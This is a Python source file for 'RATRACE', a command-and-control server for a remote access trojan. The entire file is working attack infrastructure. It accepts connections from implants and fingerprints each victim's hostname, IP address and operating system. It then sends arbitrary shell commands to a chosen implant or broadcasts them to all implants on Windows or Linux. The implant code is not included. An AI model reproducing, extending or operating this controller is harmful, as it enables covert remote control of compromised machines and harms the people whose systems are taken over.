import socket
import threading
import atexit
import signal
from pwn import log, str_input, options, splash

art = r"""______  ___ ___________  ___  _____  _____  / \____/ \        /  \
| ___ \/ _ \_   _| ___ \/ _ \/  __ \|  ___| \_      _/_______/ /\ \
| |_/ / /_\ \| | | |_/ / /_\ \ /  \/| |__     \O  O/          / //
|    /|  _  || | |    /|  _  | |    |  __|    |\__/          |  |
| |\ \| | | || | | |\ \| | | | \__/\| |___    |  ___| |___\  |   
\_| \_\_| |_/\_/ \_| \_\_| |_/\____/\____/     \ |  | /  \ \ /
================================================w====w====w=w======
0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0
==================================================================="""

class C2Server:
    def __init__(self, host='0.0.0.0', port=5555):
        self.host = host
        self.port = port
        self.clients: list[socket.socket] = []
        self.current_client_index = 0
        self.running = True
        self.server = None
        self.listening = None

    def start(self):
        if self.server:
            self.server.close()

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
            s.bind((self.host, self.port))
            s.listen(50)
            s.settimeout(1.0)
            self.server = s

            while self.running:
                try:
                    client_socket, addr = s.accept()
                    log.info(f"Accepted connection from {addr[0]}:{addr[1]}")
                    self.clients.append(client_socket)
                except socket.timeout:
                    continue
                except OSError:
                    break

    def stop(self):
        self.running = False
        if self.server:
            try:
                self.server.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass
            finally:
                self.server.close()
                self.server = None

        for client in self.clients[:]:
            try:
                client.close()
            except OSError:
                pass
            finally:
                self.clients.remove(client)

        if self.listening:
            self.listening.success()

    def select_client(self, choice):
        if not self.clients:
            return None
        self.current_client_index = choice
        return self.clients[self.current_client_index]

    def send_command(self, command):
        client = self.select_client(self.current_client_index)
        if not client:
            log.warning("No active clients")
            return
        if command.strip() == "":
            return
        try:
            client.send(command.encode())
            client.settimeout(2.0)
            response = client.recv(4096).decode()
            return response
        except Exception as e:
            log.warning(f"Error: {e}")
            self.clients.remove(client)

    def remove_dead(self):
        alive_clients = []
        for client in self.clients:
            try:
                client.send("info".encode())
                client.settimeout(1)
                if client.recv(1024):
                    alive_clients.append(client)
            except (socket.error, ConnectionResetError):
                continue
        self.clients = alive_clients

    def list_clients(self):
        self.remove_dead()
        if len(self.clients) > 0:
            #Format: Hostname, ip, os
            nice_client_list = []
            seperator= ", "
            for index, client in enumerate(self.clients):
                self.select_client(index)
                client_data = [self.send_command('python -c "import platform; print(platform.node())"')]  #Hostname
                client_data.append(client.getpeername()[0]),                                               #Ip
                client_data = list(client_data)
                client_data.append(self.send_command('python -c "import os; print(os.name)"'))            #OS
                if client_data[2] == "nt":
                    client_data[2] = "Windows"
                else:
                    client_data[2] = "Linux/Other"
                client_data = seperator.join(client_data)
                nice_client_list.append(client_data)
            return nice_client_list
        else:
            log.warning("No clients connected")
            return []


if __name__ == "__main__":
    items = ["Start Server","Check Clients", "Connect to Client", "Send to All Clients", "Exit"]
    running = False
    server = C2Server()
    server_thread = None

    atexit.register(server.stop)

    def handle_sigint(sig, frame):
        log.info("Caught CTRL + C, Shutting Down")
        server.stop()
        exit(0)
    signal.signal(signal.SIGINT, handle_sigint)

    def interactive(sendall = False, operating_system = None):
        run_interactive = True
        runstatus = log.waitfor(f"Interactive mode | enter 'return' to quit | STATUS = ", status = "Commanding")
        while run_interactive:
            command = str_input('C2> ')
            if command == "exit":
                log.warning("Exit breaks implants, use 'return' to quit [No Commands Sent]")
            if command == "return":
                run_interactive = False
                log.info("Returning...\n")
            else:
                if sendall:
                    server.remove_dead()
                    for i in range(len(server.clients)):
                        server.select_client(i)
                        if operating_system is not None and server.send_command('python -c "import os; print(os.name)"') != operating_system:
                            pass
                        else:
                            output = server.send_command(command)
                            log.info(output)
                    log.info("Finished sending to all clients")
                else:
                    output = server.send_command(command)
                    log.info(output)
        runstatus.success()

    print(art)
    run_c2 = True
    while run_c2:
        choice = options('Welcome to RATRACE - Make your Selection', items)
        if choice == 0:		#Start / Stop Server
            if not running:
                server.running = True
                server_thread = threading.Thread(target=server.start)
                server_thread.daemon = True
                server_thread.start()
                items[0] = "Stop Server"
                running = True
            elif running:
                server.stop()
                items[0] = "Start Server"
                running = False

        elif choice == 1: 	 #List Clients
            client_list = server.list_clients()
            if len(client_list) > 0:
                log.info("[ Hostname, IP, OS ]")
                for client_data in client_list:
                    log.info(client_data)

        elif choice == 2:	# Connect to a Client
            client_list = server.list_clients()
            if len(client_list) > 0:
                target = options('Select a client:', client_list)
                server.select_client(target)
                implant = server.send_command("info").split(' ')
                implant.append("interactive")
                implant.append("return")
                run_implant = True
                while run_implant:
                    c2_choice = (options(f'Connected to {implant[0]} on {client_list[target]}', implant[1:]) + 1)
                    if implant[c2_choice] != "return":
                        if implant[c2_choice] == "interactive":
                            interactive()
                        else:
                            output = server.send_command(implant[c2_choice])
                            log.info(output)
                    else:
                        log.info("Returning...\n")
                        run_implant = False
            else:
                log.warning("No clients connected")

        elif choice == 3: #sendall
            if len(server.clients) > 0:
                server.remove_dead()
                sendChoice = options("What System to Target?", ["All", "Windows", "Linux"])
                if sendChoice == 0:
                    interactive(True)
                elif sendChoice == 1:
                    interactive(True, "nt")
                elif sendChoice == 2:
                    interactive(True, "posix")
            else:
                log.warning("No clients connected")

        else:
            server.stop()
            run_c2 = False
            splash()
            input("Press enter to continue...")